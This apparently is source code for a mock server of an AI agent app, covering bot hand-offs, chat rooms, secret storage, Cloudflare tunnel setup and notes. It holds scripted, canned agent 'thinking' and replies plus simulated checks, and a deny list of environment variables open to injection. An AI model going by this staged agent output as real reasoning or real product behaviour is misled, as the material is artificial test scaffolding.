function handOffDm(call, sender, recipient, message, from) {
  const dm = findOrCreateDm(sender, recipient);
  if (dm.turn || dm.compactTimer) {
    const ours = dm.info.working_for?.session_id === from.info.id;
    return {
      is_error: true,
      text: ours ? `@${recipient.handle} is still working on what this chat handed it earlier; its reply will arrive here. Send this after that, or put both in one message.`
        : `@${recipient.handle} is busy with another conversation; try again shortly.`,
    };
  }
  const since = now();
  dm.info.working_for = { session_id: from.info.id, call_id: call.id, since, from_seq: dm.info.last_seq ?? 0 };
  runDmReply(dm, sender, recipient, message, from).then((r) => {
    delete dm.info.working_for;
    emitSession(dm);
    if (state.sessions.get(from.info.id) !== from) return; // the asking chat was deleted
    const stopped = r.outcome === 'aborted';
    const body = stopped ? `@${recipient.handle} was stopped before it replied. Wait for the user before handing it this again.`
      : r.is_error ? `@${recipient.handle} did not reply: ${r.text}` : r.text;
    const content = [{ type: 'text', text: `${replyHeader(recipient.handle, now() - since, dm.info.id)}\n\n${body}` }];
    if (from.turn) { from.steers.push({ content, author: recipient.id }); return; }
    addEntry(from, { kind: 'user', content, author: recipient.id });
    from.info.preview = computePreview(from.entries);
    emitSession(from);
    if (stopped) return;
    from.info.status = 'running';
    emitSession(from);
    startTurn(from, '', (t) => t.step({
      thinking: r.is_error ? `${recipient.name} couldn't answer. Say so plainly.` : `${recipient.name} replied. Relay it faithfully, without padding.`,
      text: r.is_error ? `I couldn't get an answer from ${recipient.name}: ${r.text}` : relayText(sender, recipient, r.text),
    }));
  });
  return {
    text: `Sent to @${recipient.handle}, which is working on it now in its own conversation. Its reply will arrive in this chat as a message from @${recipient.handle}, and you will continue then. Meanwhile go on with other work; don't wait, poll or send it again. If nothing else can be done until it replies, tell the user you are waiting for @${recipient.handle} and end your turn.`,
    details: { bot: `@${recipient.handle}`, session_id: dm.info.id, background: true },
  };
}
/** Stop the bots working for `rec` (abort/delete; engine handoffs.rs stop_bot_handoffs). */
function stopBotHandoffs(rec) {
  for (const dm of state.sessions.values()) if (dm.turn && dm.info.working_for?.session_id === rec.info.id) abortTurn(dm);
}
async function deliverDm(turn, rt, sender, recipient, message, from) {
  const dm = findOrCreateDm(sender, recipient);
  turn.toolOutput(rt, `Delivered to @${recipient.handle} in "${dm.info.title}". Waiting for a reply…\n`);
  const reply = runDmReply(dm, sender, recipient, message, from);
  // Aborting the asking turn also stops the reply in the DM.
  const out = await turn.wait((done) => { reply.then(done); return () => abortTurn(dm); });
  return { ...out, details: { session_id: dm.info.id, to: recipient.id } };
}
async function scenarioMessageBot(t, text, rec) {
  const sender = sessionBot(rec); // null: the plain Tessera agent is asking
  const { recipient, verb, rest } = findBotTarget(text, sender);
  const message = composeDm(recipient, verb, rest);
  const allowed = canMessage(sender, recipient);
  // In the background unless the user wants the answer first ("… and wait for it"), or only waiting works here.
  const background = !/\bwait\b/i.test(text) && mayHandOffInBackground(rec);
  const [r] = await t.step({
    thinking: `This is ${recipient.name}'s area (${recipient.role || 'another bot'}). Message @${recipient.handle} privately and relay the answer instead of guessing.`,
    text: sender ? `I'll check with ${recipient.name}.` : `I'll ask ${recipient.name}.`,
    calls: [{
      name: 'message_bot', args: { to: recipient.handle, message, ...(background ? {} : { wait: true }) },
      // "Ask me first" (tools/meta.rs): a plain chat's hand-off waits for the user, whatever the chat's mode.
      ...(allowed && !sender && settingsState().security.bot_handoff === 'ask'
        ? { approval: { summary: `Hand work to @${recipient.handle}`, reason: `This chat wants @${recipient.handle} to do something for it. You asked to approve each time a chat hands work to a bot.`, always: true } }
        : {}),
      exec: allowed
        ? { duration: 250, run: (turn, call, rt) => (background ? handOffDm(call, sender, recipient, message, rec) : deliverDm(turn, rt, sender, recipient, message, rec)) }
        : { duration: 250, is_error: true, text: handoffRefusal(sender, recipient) },
    }],
  });
  const failed = r.is_error || r.denied;
  if (background && allowed && !failed) {
    // Handed over: the reply comes back as a message, and the chat goes on then.
    await t.step({
      thinking: `Handed to ${recipient.name}; its reply comes back here by itself. Nothing else to do until then, so end the turn.`,
      text: `I've handed this to ${recipient.name}, who is working on it now. I'll pass on the reply as soon as it comes in; you can keep chatting meanwhile.`,
    });
    return;
  }
  await t.step({
    thinking: !allowed ? 'Not allowed to message that bot. Say so, and suggest the alternatives.'
      : failed ? `${recipient.name} couldn't answer. Say so plainly.`
        : `${recipient.name} answered. Relay it faithfully in my own voice, without padding.`,
    text: !allowed ? refusedRelay(sender, recipient)
      : failed ? `I couldn't get an answer from ${recipient.name}: ${r.text ?? 'the message was not sent'}`
        : relayText(sender, recipient, r.text),
  });
}

// ── rooms ──
function askFor(bot) {
  switch (persona(bot)) {
    case 'engineer': return 'can you confirm the build side is ready by Wednesday evening?';
    case 'researcher': return "can you pull two or three sources on this so we're not guessing?";
    case 'planner': return 'can you get this onto the calendar?';
    default: return 'can you take it from here?';
  }
}
/** Hand the floor on only when nobody else is queued, and only to members who haven't spoken yet. */
function chooseHandoff(bot, fresh, text) {
  if (!fresh.length) return null;
  if (persona(bot) === 'planner') return fresh.find((b) => persona(b) === 'engineer') ?? fresh.find((b) => persona(b) === 'researcher') ?? null;
  return hashStr(text + bot.id) % 3 === 0 ? fresh[0] : null;
}
/** One room speaker's reply; `prev` is the previous speaker this round. */
function roomReply(bot, { text, prev, handoff, withTool }) {
  const q = quoteOf(text, 90);
  const kw = keywords(text);
  const pass = handoff ? `\n\n@${handoff.handle}, ${askFor(handoff)}` : '';
  switch (persona(bot)) {
    case 'planner': return {
      thinking: prev ? `${prev.name} already answered. I'll add the scheduling angle instead of repeating it.` : `"${truncate(q, 80)}": turn it into something scheduled, with an owner. Keep it short.`,
      pre: 'Checking what we already decided.',
      calls: withTool ? [recallCall(kw.slice(0, 3).join(' ') || 'launch')] : [],
      after: 'Thursday is launch day; slot this around it.',
      text: md`
${prev ? `Building on ${prev.name}'s point, here's` : "Here's"} how I'd fit *"${q}"* into the week:

- **Today:** agree the scope and one owner (15 minutes is plenty)
- **Tomorrow morning:** first pass, while the calendar is clear
- **Thursday:** kept free for the launch${pass || "\n\nI'll set reminders unless someone objects."}`,
    };
    case 'engineer': return {
      thinking: prev ? `${prev.name} covered the rest. Check the tree and add only what's missing.` : `Check the tree before answering "${truncate(q, 80)}".`,
      pre: 'Checking the tree.',
      calls: withTool ? [bashCall('cargo check --workspace', CHECK_OUTPUT)] : [],
      after: 'Clean. Keep it short.',
      text: [
        prev ? `Re ${prev.name}: agreed, but ship it behind a flag.` : null,
        withTool ? '`cargo check` is clean, so nothing blocks this on my side.' : 'Nothing blocks this on my side.',
        `On "${q}": smallest version first, behind a test. Half a day.`,
      ].filter(Boolean).join(' ') + pass,
    };
    case 'researcher': {
      const sources = pickSources(text + bot.id, 2);
      return {
        thinking: prev ? `${prev.name} gave the practical side. Add sources rather than opinions.` : `Search first, then summarise "${truncate(q, 80)}" with links.`,
        pre: 'Searching.',
        calls: withTool ? [webSearchCall(kw.join(' ') || q, sources)] : [],
        after: 'Two solid sources. Short summary, links, confidence.',
        text: md`
${prev ? `Adding to ${prev.name}'s answer, here's` : "Here's"} what I found on *"${q}"*:

${sourceBullets(sources)}

Short version: start small and measure; the sources agree on that much.${pass}`,
      };
    }
    default: return {
      thinking: `Answer "${truncate(q, 80)}" as ${bot.name}.`,
      text: `${prev ? `Agree with ${prev.name}. ` : ''}${bot.name} here: on "${q}", I'd start small and report back.${pass}`,
    };
  }
}
/**
 * A user message in a room: the @mentioned members reply in mention order (all members in member order
 * when nobody is mentioned). A reply that @mentions another member hands it the floor, unless that member
 * has already spoken twice this round. At most MAX_ROOM_TURNS bot turns per user message.
 */
async function scenarioRoom(t, text, rec) {
  const members = rec.info.members.map(botById).filter(Boolean);
  if (!members.length) {
    addEntry(rec, { kind: 'notice', level: 'warning', text: 'Nobody in this room can reply: add a bot to it first.' });
    return;
  }
  const mentioned = mentionsIn(text, members);
  const queue = mentioned.length ? mentioned : [...members];
  const spoke = new Map(); // bot id -> turns this round
  let turns = 0, prev = null;
  while (queue.length && turns < MAX_ROOM_TURNS) {
    const bot = queue.shift();
    if (turns) await t.sleep(randInt(500, 1100)); // a beat between speakers
    const fresh = members.filter((m) => m !== bot && !spoke.has(m.id) && !queue.includes(m));
    const handoff = queue.length ? null : chooseHandoff(bot, fresh, text);
    const withTool = hashStr(`${text}|${bot.id}|${turns}`) % 3 !== 0;
    await speak(t, roomReply(bot, { text, prev, handoff, withTool }), { author: bot.id, model: bot.model ?? rec.info.model });
    turns++;
    spoke.set(bot.id, (spoke.get(bot.id) ?? 0) + 1);
    prev = bot;
    const said = textOf(rec.entries.findLast((e) => e.kind === 'assistant' && e.author === bot.id)?.content);
    const next = mentionsIn(said, members).filter((m) => m !== bot && (spoke.get(m.id) ?? 0) < 2);
    for (const m of next.reverse()) {
      const i = queue.indexOf(m);
      if (i >= 0) queue.splice(i, 1);
      queue.unshift(m);
    }
  }
}

// ─── RPC handlers (response types per crates/proto Request docs) ────────────
const THINKING = ['auto', 'off', 'minimal', 'low', 'medium', 'high', 'xhigh', 'max'];
const PERMISSIONS = ['default', 'auto', 'ask', 'read_only'];
const KINDS = ['openai_chat', 'openai_responses', 'openai_codex', 'anthropic'];
/** Permission mode; "yolo" is accepted as an alias for "auto". */
const permissionOf = (v) => oneOf(v === 'yolo' ? 'auto' : v, PERMISSIONS, 'permission mode');
const strings = (v) => (Array.isArray(v) ? v.filter((x) => typeof x === 'string').map((s) => s.trim()).filter(Boolean) : []);
function avatarOf(raw, name) {
  const s = String(raw ?? '').trim();
  if (!s) return ([...name][0] ?? '?').toUpperCase();
  return [...new Intl.Segmenter(undefined, { granularity: 'grapheme' }).segment(s)].slice(0, 2).map((x) => x.segment).join('');
}
/** Channel members given as bot ids or handles → ids (deduped, all known, at least one). */
function resolveMembers(list) {
  if (!Array.isArray(list)) throw badRequest('members must be a list of bot ids or handles');
  const ids = [];
  for (const raw of list) {
    const key = String(raw ?? '').trim();
    const bot = botById(key) ?? botByHandle(key.replace(/^@+/, ''));
    if (!bot) throw badRequest(`Unknown bot \`${key}\``);
    if (!ids.includes(bot.id)) ids.push(bot.id);
  }
  if (!ids.length) throw badRequest('A channel needs at least one bot');
  return ids;
}
const modelRef = (m) => {
  if (!m?.provider || !m?.model) throw badRequest('model must be { provider, model }');
  return { provider: String(m.provider), model: String(m.model) };
};
const findProvider = (id) => {
  const prov = state.providers.find((x) => x.id === id);
  if (!prov) throw notFound(`Provider not found: ${id}`);
  return prov;
};
const oauthLabel = (prov) => (prov.kind === 'openai_codex' ? 'ChatGPT' : prov.name);
function markSignedIn(prov) {
  const timer = state.oauthTimers.get(prov.id);
  if (timer) { clearTimeout(timer); miscTimers.delete(timer); state.oauthTimers.delete(prov.id); }
  prov.authenticated = true;
  // Another ChatGPT account of the user's (accounts.rs): another email.
  prov.account = prov.id === 'openai-codex' || !prov.id.startsWith('openai-codex-') ? 'you@example.com' : `${prov.id.slice('openai-codex-'.length)}@example.com`;
  broadcast({ type: 'providers_changed' });
}

const MOCK_FINGERPRINT = '3f9a 1c2b 77e0 5d41 a0c9';
/** `tessera://pair?…` as the real server builds it (crates/proto PairLink::to_link). */
function pairLink(code) {
  const q = [['v', '1'], ['n', state.serverInfo.name], ['u', `http://${HOST}:${PORT}`]];
  for (const u of state.remote.urls) q.push(['u', u]);
  for (const [k, v] of state.remote.headers) q.push(['h', `${k}:${v}`]);
  q.push(['c', code], ['f', MOCK_FINGERPRINT.replace(/ /g, '')]);
  return 'tessera://pair?' + q.map(([k, v]) => `${k}=${encodeURIComponent(v)}`).join('&');
}
// ── passwords & keys (auth.rs save_secret / list_secrets) ──
const SECRET_KINDS = ['token', 'login', 'custom'];
const RESERVED_ENV = new Set(['PATH', 'HOME', 'USER', 'SHELL', 'PWD', 'TERM', 'LANG', 'TMPDIR', 'PYTHONPATH', 'NODE_OPTIONS', 'BASH_ENV', 'ENV', 'PROMPT_COMMAND']);
/** SecretInfo: never the values; `fields` are the sorted field names ([] for a token). */
function secretInfo(name) {
  const s = state.secrets.get(name);
  return {
    name, updated_at: s.updated_at, kind: s.kind, description: s.description,
    fields: s.kind === 'token' ? [] : Object.keys(s.fields).sort(), ask: s.ask, hosts: [...s.hosts],
    ...(s.last_used != null ? { last_used: s.last_used } : {}),
    ...(s.bots ? { bots: [...s.bots] } : {}),
    on_server: s.on_server !== false, on_machines: [...(s.on_machines ?? [])],
    machines_default: secretFollows(s),
    ...(s.chat ? { chat: s.chat } : {}),
  };
}
/** auth.rs follows_default: its machines follow "Let saved passwords be used on my machines" unless it chose its own. */
const secretFollows = (s) => s.machines_default ?? !(s.on_machines ?? []).length;
const idList = (v) => [...new Set(strings(Array.isArray(v) ? v : []).map((x) => x.trim()).filter(Boolean))].sort();
/** Create or update a secret or login; empty field values keep what is stored. → SecretInfo */
function saveSecret({ name, kind = 'token', description = '', fields = {}, remove_fields = [], ask = true, hosts = [], bots, on_server, on_machines, new_name, machines_default }) {
  name = String(name);
  if (!/^[A-Z_][A-Z0-9_]*$/.test(name) || name.length > 64) throw badRequest('secret names look like environment variables: A–Z, 0–9 and _ (e.g. GITHUB_TOKEN)');
  if (RESERVED_ENV.has(name) || name.startsWith('LD_') || name.startsWith('DYLD_')) throw badRequest(`\`${name}\` is reserved`);
  kind = oneOf(kind ?? 'token', SECRET_KINDS, 'secret kind');
  if (typeof fields !== 'object' || fields === null || Array.isArray(fields)) throw badRequest('fields must be an object');
  const entries = Object.entries(fields).map(([f, v]) => [f, v == null ? '' : String(v)]).sort(([a], [b]) => (a < b ? -1 : a > b ? 1 : 0));
  for (const [f] of entries) {
    if (!/^[a-z0-9_]{1,32}$/.test(f)) throw badRequest('field names are lowercase letters, digits and _ (e.g. username, api_key)');
  }
  const seed = fields.totp ? String(fields.totp).replace(/[\s=-]/g, '').toUpperCase() : '';
  if (fields.totp && !/^[A-Z2-7]{16,}$/.test(seed)) throw badRequest('the TOTP secret must be the base32 seed shown when you set up two-factor login');
  const normHosts = strings(Array.isArray(hosts) ? hosts : [])
    .map((h) => h.replace(/^https:\/\//, '').replace(/^http:\/\//, '').replace(/\/+$/, '').toLowerCase()).filter(Boolean);
  const old = state.secrets.get(name);
  const target = new_name != null && String(new_name).trim() && String(new_name).trim() !== name ? String(new_name).trim() : name;
  if (target !== name) {
    if (!old) throw badRequest(`there is no secret ${name} to rename`);
    if (!/^[A-Z_][A-Z0-9_]*$/.test(target) || target.length > 64) throw badRequest('secret names look like environment variables: A–Z, 0–9 and _ (e.g. GITHUB_TOKEN)');
    if (state.secrets.has(target)) throw badRequest(`${target} is taken; pick another name`);
  }
  const s = old ? { ...old, fields: { ...old.fields } } : { value: '', updated_at: 0, kind, description: '', fields: {}, ask, hosts: [], on_server: true, on_machines: [] };
  if (bots !== undefined) s.bots = bots === null ? undefined : idList(bots);
  if (on_server !== undefined && on_server !== null) s.on_server = on_server !== false;
  if (on_machines !== undefined && on_machines !== null) {
    s.on_machines = idList(on_machines);
    // An app that names machines picks them for this one (auth.rs save_secret_scoped).
    if (machines_default == null && s.on_machines.length) s.machines_default = false;
  }
  if (machines_default != null) s.machines_default = machines_default === true;
  s.kind = kind;
  s.description = oneLine(String(description ?? ''), 200);
  s.ask = ask !== false;
  s.hosts = normHosts;
  for (const r of Array.isArray(remove_fields) ? remove_fields : []) delete s.fields[String(r)];
  for (const [f, v] of entries) {
    if (!v) continue; // empty keeps what is stored
    if (kind === 'token') s.value = v;
    else s.fields[f] = v;
  }
  if (kind === 'token') {
    s.fields = {};
    if (!s.value) throw badRequest('the secret value is empty');
  } else {
    s.value = '';
    if (!Object.keys(s.fields).length) throw badRequest('add at least one field');
  }
  s.updated_at = now();
  state.secrets.delete(name);
  state.secrets.set(target, s);
  return secretInfo(target);
}

/** tools/secrets.rs says_little: titles that say nothing about what a password is for. */
function titleSaysLittle(title, name) {
  if (String(title ?? '').trim() === name) return true; // the variable name itself, not a title written like it
  const t = String(title ?? '').trim().toLowerCase();
  return !t || t === 'saved from a chat' || t === 'typed in a chat' || t.endsWith(', saved from a chat') || t.endsWith(', typed in a chat');
}
const TITLE_KNOWN = { ANTHROPIC_API_KEY: 'Anthropic API key', OPENROUTER_API_KEY: 'OpenRouter API key', OPENAI_API_KEY: 'OpenAI API key', STRIPE_SECRET_KEY: 'Stripe secret key', API_KEY: 'API key', GITHUB_TOKEN: 'GitHub token', GITLAB_TOKEN: 'GitLab token', SLACK_TOKEN: 'Slack token', GOOGLE_API_KEY: 'Google API key', HF_TOKEN: 'Hugging Face token', GROQ_API_KEY: 'Groq API key', REPLICATE_API_TOKEN: 'Replicate token', XAI_API_KEY: 'xAI API key', PERPLEXITY_API_KEY: 'Perplexity API key', NPM_TOKEN: 'npm token', TELEGRAM_BOT_TOKEN: 'Telegram bot token', PRIVATE_KEY: 'private key' };
const TITLE_SPELLED = { github: 'GitHub', gitlab: 'GitLab', gitea: 'Gitea', openai: 'OpenAI', openrouter: 'OpenRouter', anthropic: 'Anthropic', cloudflare: 'Cloudflare', google: 'Google', telegram: 'Telegram', signal: 'Signal', paypal: 'PayPal', api: 'API', aws: 'AWS', nas: 'NAS', wifi: 'Wi-Fi', otp: 'one-time code', pw: 'password', pwd: 'password', pass: 'password', passwd: 'password', usr: 'user', db: 'database' };
/** tools/secrets.rs suggest_title: a clear title from the name, kind, sites and machine names (never a value). */
function suggestTitle(name, kind, hosts, machines) {
  const m = /^(.+)_(\d+)$/.exec(name);
  const [base, nth] = m ? [m[1], m[2]] : [name, null];
  let words = TITLE_KNOWN[base] ? [TITLE_KNOWN[base]] : base.split('_').filter(Boolean).map((w) => {
    const lw = w.toLowerCase();
    const machine = machines.find((x) => x.toLowerCase() === lw);
    if (machine) return machine;
    if (TITLE_SPELLED[lw]) return TITLE_SPELLED[lw];
    if (w.length <= 5 && !/[aeiouy]/.test(lw)) return w.toUpperCase();
    return lw;
  });
  const has = (any) => words.some((w) => any.some((a) => w.toLowerCase().includes(a)));
  if (kind === 'token' && !has(['key', 'token', 'secret', 'password', 'code', 'pin'])) words = [...words, 'key'];
  if (kind === 'login' && !has(['login', 'password', 'account', 'sign', 'credential', 'user'])) words = [...words, 'login'];
  let title = words.join(' ');
  title = title.charAt(0).toUpperCase() + title.slice(1);
  if (nth) title += ` ${nth}`;
  const host = hosts[0]?.replace(/^www\./, '');
  if (host) {
    const parts = host.split('.');
    const main = parts.length > 1 && !/^[\d.:]+$/.test(host) ? parts[parts.length - 2] : host;
    if (!title.toLowerCase().includes(main.toLowerCase())) title += ` (${host})`;
  }
  return oneLine(title, 80);
}
/** tools/secrets.rs suggest_titles: the entries whose titles say little, with a clearer one each. */
function suggestTitles() {
  const machines = machinesState().map((m) => m.name);
  return [...state.secrets.keys()].sort().map(secretInfo).filter((s) => titleSaysLittle(s.description, s.name)).flatMap((s) => {
    const kept = s.description.trim().replace(/, (saved|typed) in a chat$/, '').replace(/, saved from a chat$/, '').trim();
    const suggested = kept && !titleSaysLittle(kept, s.name) ? kept : suggestTitle(s.name, s.kind, s.hosts, machines);
    return suggested !== s.description ? [{ name: s.name, title: s.description, suggested }] : [];
  });
}

// ── setup, local models, Cloudflare, mosaics ──
const sleep = (ms) => new Promise((r) => setTimeout(r, ms));
const MOCK_SERVER_KEY = crypto.createHash('sha256').update('tessera-mock-identity').digest('base64');
const CF_ZONES = [
  { id: 'zone_4f1c9a2e7b3d', name: 'example.com', account_id: 'acct_9d2e6b1f4a7c' },
  { id: 'zone_8a3e5c7d1f92', name: 'myhome.dev', account_id: 'acct_9d2e6b1f4a7c' },
];
const CF_SETUP_STEPS = (hostname) => ['Checking the token', 'Creating the tunnel', `Adding the DNS record ${hostname}`, 'Protecting it with Cloudflare Access',
  'Creating a service token for your devices', 'Starting cloudflared', 'Checking it answers'];
const CF_REMOVE_STEPS = ['Stopping cloudflared', 'Deleting the tunnel and DNS record', 'Removing the Access app'];
const CF_STEP_MS = 700;
// The engine's words when Cloudflare refuses Access (crates/core/src/remote.rs ZERO_TRUST_HELP), with Cloudflare's own.
const CF_FAIL = "Cloudflare didn't let Tessera use Access, the door that lets only your devices in. Usually that's because Zero Trust isn't turned on for this Cloudflare account yet. It's free: open https://one.dash.cloudflare.com, choose a team name and the Free plan, then try again. If it's on already, check that the token has Access: Apps and Policies · Edit and Access: Service Tokens · Edit. (Cloudflare said: Access is not enabled on this account)";
const KEY_LIFETIME = 365 * 86_400; // seconds: Cloudflare's service tokens, and what a renewal adds
/** A Cloudflare API token as the mock judges it: empty or containing "bad" is rejected. */
function checkCfToken(token) {
  const t = String(token ?? '').trim();
  if (!t) throw badRequest('paste a Cloudflare API token first');
  if (/bad/i.test(t)) throw badRequest('Cloudflare rejected this token: it needs Zone · DNS · Edit');
}
const cfProgress = (step, done, error) => broadcast({ type: 'setup_progress', task: 'cloudflare', step, done, ...(error ? { error } : {}) });
/** Runs `steps` (done: false, ~700 ms, done: true); `failAt` (index) ends that step with `error` and throws. */
async function cfSteps(steps, failAt = -1) {
  for (const [i, step] of steps.entries()) {
    cfProgress(step, false);
    await sleep(CF_STEP_MS);
    if (i === failAt) {
      cfProgress(step, true, CF_FAIL);
      throw badRequest(CF_FAIL);
    }
    cfProgress(step, true);
  }
}
function remoteStatus() {
  const r = state.remote;
  return {
    lan_urls: state.lan ? [`http://192.168.1.42:${PORT}`] : [],
    urls: [...r.urls],
    header_names: r.headers.map(([k]) => k),
    // running/connected/error: set by `mock_tunnel` (APP-SETUP block); a fresh tunnel is up.
    ...(r.tunnel ? { tunnel: { hostname: r.tunnel.hostname, tunnel_id: r.tunnel.tunnel_id, running: r.tunnel.running ?? true, connected: r.tunnel.connected ?? true, ...(r.tunnel.error ? { error: r.tunnel.error } : {}), ...(r.tunnel.key_expires_at != null ? { key_expires_at: r.tunnel.key_expires_at } : {}), renewable: true } } : {}),
    web: webAccessStatus(),
  };
}
function webAccessStatus() {
  const r = state.remote;
  const https = r.urls.find((u) => u.startsWith('https://')) ?? (r.tunnel ? `https://${r.tunnel.hostname}` : null);
  return {
    on: r.web.on,
    available: r.web.available,
    ...(https ? { url: `${https.replace(/\/+$/, '')}/web/` } : {}),
    needs_token: !!r.tunnel && !r.web.door,
    browsers: state.devices.filter((d) => d.browser).length,
  };
}
const EMPTY_MOSAICS = () => ({ version: 0, mosaics: [] });
/** A MosaicLayout from a client, checked like serde would (plus the engine's limits); private tiles dropped. */
function cleanMosaics(layout) {
  if (!layout || typeof layout !== 'object' || Array.isArray(layout)) throw badRequest('layout must be { version, mosaics }');
  const version = Number(need(layout, 'version'));
  const mosaics = need(layout, 'mosaics');
  if (!Number.isInteger(version) || version < 0 || !Array.isArray(mosaics)) throw badRequest('layout must be { version, mosaics }');
  const out = mosaics.map((m) => {
    if (!m || typeof m !== 'object') throw badRequest('each mosaic must be { id, name, layout, tiles, geometry? }');
    const tiles = need(m, 'tiles');
    if (!Array.isArray(tiles)) throw badRequest('mosaic tiles must be a list');
    return {
      id: String(need(m, 'id')), name: oneLine(String(need(m, 'name')), 60), layout: String(m.layout ?? ''),
      tiles: tiles.map((tile) => {
        if (!tile || typeof tile !== 'object') throw badRequest('each tile must be { id, session_id?, board_id? }');
        return {
          id: String(need(tile, 'id')),
          ...(tile.session_id != null ? { session_id: String(tile.session_id) } : {}),
          ...(tile.board_id != null ? { board_id: String(tile.board_id) } : {}),
          ...(tile.note_id != null ? { note_id: String(tile.note_id) } : {}),
        };
      }).filter((tile) => !(tile.session_id && state.sessions.get(tile.session_id)?.info.private)) // never stored, not even as a tile
        .filter((tile) => !tile.board_id || state.boards.has(tile.board_id)) // tiles of deleted boards are dropped
        .filter((tile) => !tile.note_id || state.notes.has(tile.note_id)), // and of deleted notes
      ...(m.geometry != null && JSON.stringify(m.geometry).length <= 64 << 10 ? { geometry: m.geometry } : {}),
    };
  });
  return { version, mosaics: out };
}
function setMosaics(layout) {
  state.mosaics = layout;
  broadcast({ type: 'mosaics_changed', layout });
  return layout;
}

// ─── model roles (engine model_roles, config roles) ─────────────────────────
const BUILTIN_ROLES = [
  ['default', 'Default', 'New chats, and anything without a model of its own.'],
  ['utility', 'Utility', 'Titles, summaries and page extracts (also @fast). Unset: each chat\'s own model.'],
  ['memory', 'Memory & learning', 'The background review that saves memories and skills. Unset: @utility, then the chat\'s own model.'],
];
const refStr = (m) => (m ? `${m.provider}/${m.model}` : undefined);
/** "provider/model" (a role's value) → ModelRef. */
function parseRef(v) {
  const i = String(v).indexOf('/');
  if (i <= 0 || i === v.length - 1) throw badRequest(`\`${v}\` isn't provider/model`);
  return { provider: v.slice(0, i), model: v.slice(i + 1) };
}
/** `@role` or `provider/model` → the model it names now (undefined when unset). */
function resolveRole(name, depth = 0) {
  if (depth > 8) return undefined;
  if (name === 'fast') name = 'utility';
  if (name === 'default') return state.serverInfo.default_model ?? undefined;
  const v = state.roles.get(name);
  if (!v) return undefined;
  if (v.startsWith('@')) return resolveRole(v.slice(1), depth + 1);
  return parseRef(v);
}
function modelRoles() {
  const roles = BUILTIN_ROLES.map(([name, label, description]) => {
    const value = name === 'default' ? refStr(state.serverInfo.default_model) : state.roles.get(name);
    const resolved = name === 'memory' ? resolveRole('memory') ?? resolveRole('utility') : resolveRole(name);
    return { name, label, description, ...(value ? { value } : {}), ...(resolved ? { resolved } : {}), builtin: true };
  });
  for (const [name, value] of state.roles) {
    if (BUILTIN_ROLES.some(([n]) => n === name)) continue;
    const resolved = resolveRole(name);
    roles.push({ name, label: name, description: `Your own role: use @${name} wherever a model is chosen.`, value, ...(resolved ? { resolved } : {}), builtin: false });
  }
  return { roles };
}

// ─── notes library (engine notes, the `note` tool) ──────────────────────────
const NOTE_MAX = 200 << 10;
const NOTE_ASSET_MAX = 8 << 20;
/** A picture's type, extension and size from its first bytes (engine notes.rs picture_kind). */
function pictureKind(b) {
  if (b.subarray(0, 8).equals(Buffer.from([0x89, 0x50, 0x4e, 0x47, 0x0d, 0x0a, 0x1a, 0x0a]))) return { mime: 'image/png', ext: 'png', width: b.readUInt32BE(16), height: b.readUInt32BE(20) };
  if (b[0] === 0xff && b[1] === 0xd8 && b[2] === 0xff) {
    let i = 2;
    while (i + 9 < b.length && b[i] === 0xff) {
      const m = b[i + 1];
      if (m >= 0xc0 && m <= 0xcf && m !== 0xc4 && m !== 0xc8 && m !== 0xcc) return { mime: 'image/jpeg', ext: 'jpg', width: b.readUInt16BE(i + 7), height: b.readUInt16BE(i + 5) };
      i += 2 + b.readUInt16BE(i + 2);
    }
    return { mime: 'image/jpeg', ext: 'jpg', width: 0, height: 0 };
  }
  if (b.subarray(0, 6).toString('latin1') === 'GIF89a' || b.subarray(0, 6).toString('latin1') === 'GIF87a') return { mime: 'image/gif', ext: 'gif', width: b.readUInt16LE(6), height: b.readUInt16LE(8) };
  if (b.length > 12 && b.subarray(0, 4).toString('latin1') === 'RIFF' && b.subarray(8, 12).toString('latin1') === 'WEBP') return { mime: 'image/webp', ext: 'webp', width: 0, height: 0 };
  return null;
}
/** A slow link: delay (ms) before `get_note` / `save_note` answer; note_updated goes out at once (`mock_note_latency { ms }`). */
let noteLatency = 0;
/** Preview pages of a note's HTML (`preview_page`): token -> HTML. */
const previewPages = new Map();
/** notes.rs `keep_note_from_agents`: no new version; every device hears of it. */
function keepNoteFromAgents(id, keep) {
  const old = state.notes.get(id);
  if (!old) throw notFound(`no note \`${id}\``);
  if (!!old.keep_from_agents === keep) return old;
  const n = { ...old, keep_from_agents: keep, all_bots: !keep };
  state.notes.set(id, n);
  broadcast({ type: 'note_updated', note: noteInfo(n) });
  return n;
}
// engine/notes.rs note_info: each line without its leading #, >, - or * marks, the title's own line left out,
// joined into one line of at most 140 characters; marks inside a line (**bold**, `code`, links) stay as written.
const notePreview = (n) => oneLine(String(n.content ?? '').split('\n').map((l) => l.trim().replace(/^[#>\-* ]+/, '')).filter((l) => l && l !== n.title).join(' '), 140);
const noteInfo = (n) => ({ id: n.id, title: n.title, preview: notePreview(n), version: n.version, created_at: n.created_at, updated_at: n.updated_at, ...(n.session_id ? { session_id: n.session_id } : {}), by_user: n.by_user, all_bots: !n.keep_from_agents, keep_from_agents: !!n.keep_from_agents });
const NOTE_VERSION_EVERY = 10 * 60_000;
/** Keep `old` before it's replaced (engine notes.rs keep_note_version): when the writer changes, else once per stretch. */
function keepNoteVersion(old, byUser) {
  if (!old.content.trim()) return;
  const list = state.noteVersions.get(old.id) ?? [];
  const writerChanges = !!old.agent_edit === !!byUser;
  const stretch = !list.length || old.updated_at - list[0].updated_at >= NOTE_VERSION_EVERY;
  if (!writerChanges && !stretch) return;
  list.unshift({ version: old.version, title: old.title, content: old.content, updated_at: old.updated_at, agent_edit: !!old.agent_edit, ...(old.edit_session ? { edit_session: old.edit_session } : {}) });
  state.noteVersions.set(old.id, list.slice(0, 50));
}
/**
 * Create (no id) or update a note; a stale base_version is a `conflict`, unless the note already says exactly
 * this (then nothing changes: no new version, no event). Agents' saves set `agent_edit` / `edit_session`.
 * Broadcasts note_updated.
 */
function saveNote({ id, title, content, base_version, session_id, by_user }) {
  title = oneLine(String(title ?? ''), 120) || 'Untitled note';
  content = String(content ?? '');
  if (Buffer.byteLength(content) > NOTE_MAX) throw badRequest('a note can be at most 200 KB');
  const t = now();
  const sid = session_id ? String(session_id) : null;
  let n;
  if (id) {
    const old = state.notes.get(id);
    if (!old) throw notFound(`no note \`${id}\``);
    if (old.title === title && old.content === content) return old;
    if (base_version != null && Number(base_version) !== old.version) throw new RpcError('conflict', 'the note changed elsewhere: fetch it and try again');
    keepNoteVersion(old, by_user);
    n = { ...old, title, content, version: old.version + 1, updated_at: Math.max(t, old.updated_at + 1), agent_edit: !by_user };
    delete n.edit_session;
    if (!by_user && sid) n.edit_session = rootSession(sid);
  } else {
